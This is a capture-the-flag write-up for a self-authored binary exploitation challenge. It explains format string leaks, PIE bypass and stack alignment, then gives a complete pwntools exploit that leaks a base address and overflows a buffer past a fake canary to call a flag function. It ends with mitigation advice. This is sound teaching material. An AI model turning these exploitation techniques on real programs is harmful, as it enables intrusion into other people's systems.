This project taught me a lot about authoring binex problems, which also gave me an even better understanding of it. The idea of this project was to make a combination of the concepts we have done leading up to this point. The challenge starts with a little bit of reversing, and then finally using a format string vulnerability to leak an address to find the binary's base address. Finally, write a final payload to call the printme function, which gives you the flag. I give the C file in case we don't have the same libc version or if you need additional help, but the intention of this challenge is for you to figure it out with only the binary given to you.

Before we even get into solving the problem, there are a few concepts that are important to understand. Namely, what is a format string vulnerability, how does this get past PIE, what is stack alignment and why does this challenge need it, then finally what is pwntools and why is it useful.

### Format String Vulnerability

Format string vulnerabilities are what they sound like — a vulnerability that involves format strings. To understand this vulnerability, it's also important to understand calling conventions. In 64-bit programs, the calling conventions store values in registers for the first few values and then put the rest onto the stack. The order goes: rdi, rsi, rdx, rcx, r8, r9 and then you start reading from the stack.

```c
char string[];
scanf("%s", string)
printf(string)
```

You initialize a string and put user input into it. You then print directly what the user inputs. The problem is that printf will interpret format specifiers literally. If the user inputs "%p", printf has no idea where to pull the value from since you didn't give it a variable, so it starts pulling from registers (calling convention order) and then from the stack. This allows us to leak values and bypass PIE.

You usually use this by spamming `%p` to get memory locations off the stack. Then use `%N$p` to get a specific value. You can use the leaked address to bypass PIE.

### PIE

PIE (Position Independent Executable) is a protection that prevents you from hardcoding addresses into your exploit. Without PIE, the function "main" will be at the same address every time. With PIE, main will be at an offset from the base address, but both change. If you can leak an address from the stack, you can calculate the base address and find any function.

### Stack Alignment

If your exploit is not 16-byte aligned, sometimes the function you're trying to return to won't execute and just SIGSEVs. This can be mitigated by getting a ret gadget via ropper or ROPgadget and putting it right before your target function call.

### Pwntools

Pwntools is a Python library that is extremely important for binary exploitation. It can automatically pull symbols from non-stripped binaries, pack bytes correctly, make shellcode, and send payloads to programs.

### Solution

First, check the file properties:

```bash
fundamentals: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped
```

Not stripped, PIE enabled. Checksec:

```bash
$ checksec fundamentals
[*] '/home/shinigami/fundamentals'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

NX enabled, no canary found (doesn't mean the developer didn't add one). Running the binary shows we need to find the developer's favorite food. Using radare2, we find `strcmp` comparing our input against "Steak" and a comparison with the number "23".

```bash
$ ./fundamentals
What is my favorite food: Steak
What is my favorite number: 23
Give me some input: a
a
Overflow me:a
```

Testing for format string vulnerability:

```bash
Give me some input: %p
0xa
Overflow me:a
```

Format string vulnerability confirmed. Testing the overflow:

```
Overflow me:aaaa...(long string)
Stack smashing detected
```

Custom canary — checking radare2 reveals it's hardcoded as `0xdeadbeef`.

Using gdb to find offsets:

```bash
gef> info func
...
0x0000000000001199  printme
0x00000000000011ca  main
...
```

Buffer starts at 0x7fffffffe036, return address at 0x7fffffffe078. Offset: 66 bytes. Canary is 54 bytes from input.

Payload structure: `54 bytes + canary + 8 bytes + ret gadget + address of printme`

For the PIE bypass: `%17$p` leaks an address. Subtract 0x11ca to get the binary base.

### Exploit

```python
from pwn import *
elf = context.binary = ELF("./fundamentals")
p = process()

offset = 0x11ca
payload1 = "Steak"
payload2 = "23"
p.send(payload1)
p.send(" ")

p.send(payload2)
p.send(" ")

payload3 = "%17$p"
p.send(payload3)
p.send(" ")

p.recvuntil("input:")

address = int(p.recvline().strip(),16)

elf.address = address - offset
ret = elf.address + 0x1016
print(f"PIE base is {hex(elf.address)} and printme is at {hex(elf.sym['printme'])}")

canary = 0xdeadbeef
payload_final = b"A" * 54 + p32(canary) + b"A" * 8 + p64(ret) + p64(elf.sym['printme'])
p.send(payload_final)
p.send(" ")
p.interactive()
```

### Flag

```
michel{you_have_won}
```

### Mitigation

You should never have a format string vulnerability in your program and should always check the size of any input from the user. You can never implicitly trust the user. Also, it would be very hard to compile a program this insecure in the modern age, as gcc will treat these as errors unless you pass specific flags.
